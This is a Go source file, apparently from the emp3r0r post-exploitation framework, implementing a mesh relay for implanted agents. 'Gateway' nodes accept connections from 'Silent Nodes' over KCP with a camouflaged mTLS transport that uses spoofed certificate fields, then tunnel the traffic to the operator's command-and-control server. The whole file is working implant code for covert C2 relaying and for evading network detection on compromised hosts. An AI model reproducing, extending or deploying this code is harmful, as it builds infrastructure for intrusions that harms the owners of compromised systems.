package mesh

import (
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"runtime/debug"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// Bridge protocol (single-byte opcode frame):
//   Client → Gateway: [0x01] CONNECT_C2
//   Gateway → Client: [0x00] OK  (then transparent pipe)
//                     [0xFF] ERR (then 2-byte LE error len, followed by UTF-8 message)

const (
	OpcodeConnectC2 byte = 0x01
	OpcodePing      byte = 0x02
	OpcodeOK        byte = 0x00
	OpcodeErr       byte = 0xFF

	bridgeDialTimeout = 10 * time.Second
)

// DialGateway opens a KCP connection to the Gateway IP, sends the specified opcode,
// and returns a net.Conn. If opcode is OpcodeConnectC2, the conn is transparently
// piped to the real C2 TLS endpoint.
func DialGateway(ctx context.Context, gatewayIP string, opcode byte) (net.Conn, error) {
	kcpPort := common.RuntimeConfig.KCPServerPort
	addr := fmt.Sprintf("%s:%s", gatewayIP, kcpPort)

	var kcpConn net.Conn
	var err error

	t := transport.GetTransportImplementation(common.RuntimeConfig.P2PTransport)
	if camo, ok := t.(*transport.CamouflageMTLS); ok {
		camo.CertOrg = common.RuntimeConfig.CamouflageCertOrg
		camo.CertCN = common.RuntimeConfig.CamouflageCertCN
	}
	logging.Debugf("Mesh: dialing Gateway %s relay at %s", common.RuntimeConfig.P2PTransport, addr)
	kcpConn, err = t.Dial(addr, common.RuntimeConfig.Password, def.MagicString)
	if err != nil {
		return nil, fmt.Errorf("DialGateway %s: %v", addr, err)
	}

	// Send opcode
	if _, err = kcpConn.Write([]byte{opcode}); err != nil {
		kcpConn.Close()
		return nil, fmt.Errorf("DialGateway send opcode: %v", err)
	}

	// Read response
	resp := make([]byte, 1)
	kcpConn.SetDeadline(time.Now().Add(bridgeDialTimeout))
	if _, err = io.ReadFull(kcpConn, resp); err != nil {
		kcpConn.Close()
		return nil, fmt.Errorf("DialGateway read response: %v", err)
	}
	kcpConn.SetDeadline(time.Time{}) // clear deadline

	switch resp[0] {
	case OpcodeOK:
		logging.Debugf("Mesh: Gateway accepted relay, C2 tunnel established")
		return kcpConn, nil
	case OpcodeErr:
		// Read 2-byte LE error length then message
		lenBuf := make([]byte, 2)
		io.ReadFull(kcpConn, lenBuf)
		errLen := binary.LittleEndian.Uint16(lenBuf)
		msg := make([]byte, errLen)
		io.ReadFull(kcpConn, msg)
		kcpConn.Close()
		return nil, fmt.Errorf("DialGateway: gateway refused: %s", string(msg))
	default:
		kcpConn.Close()
		return nil, fmt.Errorf("DialGateway: unexpected opcode 0x%02x", resp[0])
	}
}

// ServeRelay accepts incoming KCP connections from Silent Nodes, reads the opcode,
// and if it is CONNECT_C2, dials the real C2 and pipes bytes bidirectionally.
// Only called on Gateway nodes.
func ServeRelay(ctx context.Context) {
	kcpPort := common.RuntimeConfig.KCPServerPort

	// Create ONE persistent listener for the lifetime of the relay.
	// Previously AcceptKCP created+closed a new UDP socket per accept call,
	// which invalidated the connection that was just handed off to handleRelayConn.
	var listener net.Listener
	var err error

	t := transport.GetTransportImplementation(common.RuntimeConfig.P2PTransport)
	if camo, ok := t.(*transport.CamouflageMTLS); ok {
		camo.CertOrg = common.RuntimeConfig.CamouflageCertOrg
		camo.CertCN = common.RuntimeConfig.CamouflageCertCN
	}
	listener, err = t.Listen(kcpPort, common.RuntimeConfig.Password, def.MagicString)
	logging.Infof("Mesh: Gateway relay listening on %s port %s", common.RuntimeConfig.P2PTransport, kcpPort)

	if err != nil {
		logging.Errorf("Mesh ServeRelay: failed to listen on %s port %s: %v", common.RuntimeConfig.P2PTransport, kcpPort, err)
		return
	}
	defer listener.Close()
	go func() {
		<-ctx.Done()
		listener.Close()
	}()

	for ctx.Err() == nil {
		conn, err := t.Accept(ctx, listener)
		if err != nil {
			if ctx.Err() != nil { // Context cancelled, listener closed
				logging.Debugf("Mesh ServeRelay: listener closed: %v", err)
				return
			}
			logging.Errorf("Mesh ServeRelay: accept %s connection: %v", common.RuntimeConfig.P2PTransport, err)
			continue
		}

		logging.Infof("Mesh ServeRelay: accepted %s connection from %s", common.RuntimeConfig.P2PTransport, conn.RemoteAddr())
		go handleRelayConn(ctx, conn)
	}
}

// handleRelayConn processes a single incoming relay connection.
func handleRelayConn(ctx context.Context, peer net.Conn) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("handleRelayConn panic: %v", r)
			logging.Debugf("Stack trace: %s", debug.Stack())
		}
	}()
	defer peer.Close()

	// Read opcode
	peer.SetDeadline(time.Now().Add(bridgeDialTimeout))
	op := make([]byte, 1)
	if _, err := io.ReadFull(peer, op); err != nil {
		logging.Debugf("Mesh relay: read opcode: %v", err)
		return
	}
	peer.SetDeadline(time.Time{})

	switch op[0] {
	case OpcodePing:
		logging.Debugf("Mesh relay: ping from %s", peer.RemoteAddr())
		if _, err := peer.Write([]byte{OpcodeOK}); err != nil {
			logging.Warningf("Mesh relay: send OK (ping): %v", err)
		}
		return

	case OpcodeConnectC2:
		// proceed to dial C2
	default:
		logging.Warningf("Mesh relay: unknown opcode 0x%02x from %s", op[0], peer.RemoteAddr())
		writeRelayError(peer, "unknown opcode")
		return
	}

	// Dial real C2 (TLS)
	c2Addr := def.CCAddress
	logging.Infof("Mesh relay: connecting to C2 at %s for %s", c2Addr, peer.RemoteAddr())
	c2Conn, err := transport.DialC2TLS(c2Addr, common.RuntimeConfig.C2TransportProxy)
	if err != nil {
		logging.Errorf("Mesh relay: dial C2: %v", err)
		writeRelayError(peer, fmt.Sprintf("dial server failed: %v", err))
		return
	}
	defer c2Conn.Close()

	// Confirm OK
	if _, err = peer.Write([]byte{OpcodeOK}); err != nil {
		logging.Warningf("Mesh relay: send OK: %v", err)
		return
	}

	// Transparent bidirectional pipe (Gateway cannot decrypt — it only pipes bytes).
	logging.Infof("Mesh relay: piping %s <-> C2", peer.RemoteAddr())
	errc := make(chan error, 2)
	pipe := func(dst, src net.Conn) {
		defer func() {
			if r := recover(); r != nil {
				logging.Errorf("Mesh relay pipe panic: %v", r)
			}
		}()
		_, err := io.Copy(dst, src)
		errc <- err
	}
	go pipe(c2Conn, peer)
	go pipe(peer, c2Conn)
	select {
	case <-ctx.Done():
	case err = <-errc:
		if err != nil && err != io.EOF {
			logging.Debugf("Mesh relay pipe: %v", err)
		}
	}
}

// writeRelayError sends an OpcodeErr frame with the given message.
func writeRelayError(w net.Conn, msg string) {
	b := []byte(msg)
	lenBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(lenBuf, uint16(len(b)))
	w.Write([]byte{OpcodeErr})
	w.Write(lenBuf)
	w.Write(b)
}
